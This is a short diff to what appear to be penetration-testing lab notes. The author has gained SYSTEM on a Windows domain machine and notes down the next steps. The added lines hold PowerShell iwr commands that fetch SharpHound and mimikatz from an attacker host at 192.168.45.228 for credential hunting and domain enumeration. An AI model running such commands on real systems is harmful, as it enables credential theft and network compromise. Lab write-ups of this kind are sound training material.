@@ -111,7 +111,19 @@ ERROR: Unable to get user claims information.
 
 C:\Windows\system32>
 C:\Windows\system32>
+```
 
+Starting as NT/ system, meaning I have the flag, lets look for creds, also, this is a domain machine, time for bloodhound i think
+
+
+pulling sharphound and mimikatz
+
+``` powershell
+iwr -uri "http://192.168.45.228:8888/SharpHound.exe" -outfile "C:\Users\joe\Downloads\sharp.exe"
+```
+
+``` powershell
+iwr -uri "http://192.168.45.228:8888/mimikatz.exe" -outfile "C:\Users\joe\Downloads\mimikatz.exe"
 ```
 
 
